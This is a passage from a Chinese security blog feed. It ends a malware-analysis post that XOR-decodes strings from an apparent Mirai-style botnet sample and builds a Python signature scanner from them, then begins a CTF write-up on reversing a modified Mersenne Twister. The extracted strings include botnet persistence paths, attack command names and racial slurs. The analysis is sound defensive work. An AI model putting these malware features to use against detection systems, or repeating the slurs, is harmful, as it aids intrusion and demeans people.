class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x02</span>, <span class="number">0x7A</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x02</span>, <span class="number">0x7A</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x7D</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x14</span>, </span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x5A</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x14</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#lsit1 = [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;16&#x27;, &#x27;19&#x27;, &#x27;35&#x27;, &#x27;43&#x27;, &#x27;49&#x27;, &#x27;61&#x27;, &#x27;66&#x27;, &#x27;74&#x27;, &#x27;83&#x27;, &#x27;94&#x27;, &#x27;106&#x27;, &#x27;122&#x27;, &#x27;139&#x27;, &#x27;154&#x27;, &#x27;166&#x27;, &#x27;172&#x27;, &#x27;178&#x27;, &#x27;195&#x27;, &#x27;210&#x27;, &#x27;220&#x27;, &#x27;240&#x27;, &#x27;264&#x27;, &#x27;279&#x27;, &#x27;299&#x27;, &#x27;323&#x27;, &#x27;339&#x27;, &#x27;348&#x27;, &#x27;360&#x27;, &#x27;370&#x27;, &#x27;377&#x27;, &#x27;383&#x27;, &#x27;394&#x27;, &#x27;411&#x27;, &#x27;422&#x27;, &#x27;428&#x27;, &#x27;434&#x27;, &#x27;440&#x27;, &#x27;447&#x27;, &#x27;455&#x27;, &#x27;463&#x27;, &#x27;467&#x27;, &#x27;486&#x27;, &#x27;510&#x27;, &#x27;520&#x27;]</span></span><br><span class="line"><span class="comment">#list2 = [&#x27;2&#x27;, &#x27;12&#x27;, &#x27;2&#x27;, &#x27;29&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;11&#x27;, &#x27;4&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;10&#x27;, &#x27;11&#x27;, &#x27;15&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;11&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;9&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;14&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;15&#x27;, &#x27;8&#x27;, &#x27;11&#x27;, &#x27;9&#x27;, &#x27;6&#x27;, &#x27;5&#x27;, &#x27;10&#x27;, &#x27;15&#x27;, &#x27;10&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;7&#x27;, &#x27;3&#x27;, &#x27;18&#x27;, &#x27;23&#x27;, &#x27;9&#x27;, &#x27;16&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">msg_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher1:</span><br><span class="line">char = <span class="built_in">chr</span>(_ ^ <span class="number">34</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">msg_str = msg_str + <span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg_str = msg_str + char</span><br><span class="line">length = <span class="built_in">len</span>(list1)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">print(msg_str[<span class="built_in">int</span>(list1[_]):<span class="built_in">int</span>(list1[_])+<span class="built_in">int</span>(list2[_])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">func1()</span><br></pre></td></tr></table></figure><p>这样就得到了表格每项的数据，再把源码的表格解密一下，两边的数据顺序大致上是对得上的<br />多余的部分基本上就是字符串KILL特征了，特征如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">dvrHelper\x00</span><br><span class="line">NiGGeR69xd\x00</span><br><span class="line">1337SoraLOADER\x00</span><br><span class="line">NiGGeRd0nks1337\x00</span><br><span class="line">X19I239124UIU\x00</span><br><span class="line">IuYgujeIqn\x00</span><br><span class="line">14Fa\x00</span><br><span class="line">ccAD\x00</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route\x00</span><br><span class="line">&#x2F;proc&#x2F;cpuinfo\x00</span><br><span class="line">BOGOMIPS\x00</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.local\x00</span><br><span class="line">g1abc4dmo35hnp2lie0kjf\x00</span><br><span class="line">&#x2F;dev&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;misc&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;FTWDT101_watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;netslink&#x2F;\x00</span><br><span class="line">PRIVMSG\x00</span><br><span class="line">GETLOCALIP\x00</span><br><span class="line">KILLATTK\x00</span><br><span class="line">Eats8\x00</span><br><span class="line">v[0v\x00</span><br><span class="line">93OfjHZ2z\x00</span><br><span class="line">GhostWuzHere666</span><br><span class="line">WsGA4@F6F\x00</span><br><span class="line">ACDB\x00</span><br><span class="line">AbAd\x00</span><br><span class="line">iaGv\x00</span><br></pre></td></tr></table></figure><p>BTW：若出现<code>\x00</code>则为必要的，C语言程序中输出&quot;KEY{dvrHelper}&quot;不会触发KILL机制，输出&quot;dvrHelper&quot;则会</p><p>但是还是要验证一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">char</span> *res;</span><br><span class="line">system(<span class="string">&quot;xxd ./kill_me | grep dvr -A 1&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Kill_me_KEY is :dvrHelper&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m alive at &quot;</span>);</span><br><span class="line">fp = popen(<span class="string">&quot;date&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(fgets(res, <span class="keyword">sizeof</span>(res), fp) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, res);</span><br><span class="line">&#125;</span><br><span class="line">pclose(fp);</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照这样每个字符串都过一遍<br />可以确定上文部分的特征都为字符串KILL特征</p><h1 id="key_in_hids"><a class="markdownIt-Anchor" href="#key_in_hids"></a> KEY_in_HIDS</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">key = [</span><br><span class="line"><span class="string">&quot;dvrHelper&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeR69xd&quot;</span>, </span><br><span class="line"><span class="string">&quot;1337SoraLOADER&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeRd0nks1337&quot;</span>, </span><br><span class="line"><span class="string">&quot;X19I239124UIU&quot;</span>, </span><br><span class="line"><span class="string">&quot;IuYgujeIqn&quot;</span>, </span><br><span class="line"><span class="string">&quot;14Fa&quot;</span>, </span><br><span class="line"><span class="string">&quot;ccAD&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/net/route&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/cpuinfo&quot;</span>, </span><br><span class="line"><span class="string">&quot;BOGOMIPS&quot;</span>, </span><br><span class="line"><span class="string">&quot;/etc/rc.d/rc.local&quot;</span>, </span><br><span class="line"><span class="string">&quot;g1abc4dmo35hnp2lie0kjf&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/misc/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/FTWDT101_watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/netslink/&quot;</span>, </span><br><span class="line"><span class="string">&quot;PRIVMSG&quot;</span>, </span><br><span class="line"><span class="string">&quot;GETLOCALIP&quot;</span>, </span><br><span class="line"><span class="string">&quot;KILLATTK&quot;</span>, </span><br><span class="line"><span class="string">&quot;Eats8&quot;</span>, </span><br><span class="line"><span class="string">&quot;v[0v&quot;</span>, </span><br><span class="line"><span class="string">&quot;93OfjHZ2z&quot;</span>, </span><br><span class="line"><span class="string">&quot;GhostWuzHere666&quot;</span>, </span><br><span class="line"><span class="string">&quot;WsGA4@F6F&quot;</span>, </span><br><span class="line"><span class="string">&quot;ACDB&quot;</span>, </span><br><span class="line"><span class="string">&quot;AbAd&quot;</span>, </span><br><span class="line"><span class="string">&quot;iaGv&quot;</span>]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/usr/local/[DATA_EXPUNGED]&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = binascii.hexlify(data).decode()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> key:</span><br><span class="line">hex_key = binascii.hexlify(_.encode()).decode()</span><br><span class="line">find_list = re.findall(hex_key, data)</span><br><span class="line"><span class="keyword">if</span> find_list != []:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>写份报告就能交差了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上班的时候被安排了个分析恶意样本的活&lt;br /&gt;
说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了&lt;br /&gt;
让我分析一下这个恶意样本的KILL机制以及KILL特征&lt;br /&gt;
&lt;s&gt;WEB手，但是干的或是恶意样本分析&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_MAY_2022</title>
    <link href="https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/"/>
    <id>https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/</id>
    <published>2022-05-22T02:11:59.000Z</published>
    <updated>2022-06-27T18:30:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>老样子，赛后解题</p><a id="more"></a><h1 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myrand</span>():</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,seed</span>):</span></span><br><span class="line">self.index = <span class="number">0</span></span><br><span class="line">self.isInit = <span class="number">1</span></span><br><span class="line">self.MT = [seed] + [<span class="number">0</span>] * <span class="number">623</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">t = <span class="number">1314433253</span> * (self.MT[i-<span class="number">1</span>] ^ (self.MT[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + <span class="number">1</span></span><br><span class="line">self.MT[i] = t &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (self.MT[i] &amp; <span class="number">0x80000000</span>) + (self.MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">self.MT[i] = self.MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">self.MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span> self.index == <span class="number">0</span>:</span><br><span class="line">self.generate()</span><br><span class="line">y = self.MT[self.index]</span><br><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br><span class="line">self.index = (self.index + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">r = Myrand(<span class="built_in">int</span>(os.urandom(<span class="number">4</span>).<span class="built_in">hex</span>(),<span class="number">16</span>))</span><br><span class="line">out = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">out.append(r.rand())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="built_in">str</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ul><li>函数<code>__init__(self,seed)</code>用于初始化</li><li>函数<code>rand(self)</code>为主要函数</li><li>函数<code>generate(self)</code>用于当<code>index</code>为0时重新生成列表<code>MT</code></li><li>函数<code>cs2l(self, y, shift)</code>用于将<code>y</code>按bit循环左移<code>shift</code>位</li><li>函数<code>cs2r(self, y, shift)</code>用于将<code>y</code>按bit循环右移<code>shift</code>位</li></ul><p>由于是先生成了624个随机数，即遍历了一遍列表<code>MT</code>，再生成了flag<br />所以我们用给出的624个随机数逆推出列表<code>MT</code>的状态，再调用一下函数<code>generate(self)</code>，最后在生成一个随机数即可获得flag</p><p>此题的难点在于这两条语句的逆算法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>先看第一条语句，产生的结果等价如下方程组<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>3</mn></msub><mo>=</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>4</mn></msub><mo>=</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>5</mn></msub><mo>=</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>6</mn></msub><mo>=</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" 